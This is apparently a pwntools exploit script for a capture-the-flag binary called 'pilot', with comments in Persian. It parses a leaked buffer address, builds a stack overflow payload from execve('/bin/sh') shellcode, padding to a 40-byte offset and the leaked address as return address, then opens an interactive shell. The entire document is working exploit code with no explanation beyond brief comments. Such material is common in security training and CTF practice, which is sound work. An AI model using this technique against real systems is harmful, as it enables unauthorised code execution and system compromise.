from pwn import *

p = process('./pilot')

# دریافت leak آدرس بافر
p.recvuntil(b"[*]Location:")
leak = p.recvline().strip()
input_addr = int(leak, 16)
log.info(f"Leaked input address: {hex(input_addr)}")

# shellcode pop /bin/sh (از README)
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

# offset = 0x28 (40 بایت)
offset = 0x28

filler = b"A" * (offset - len(shellcode))

payload = shellcode + filler + p64(input_addr)

# ارسال payload
p.recvuntil(b"[*]Command:")
p.sendline(payload)

p.interactive()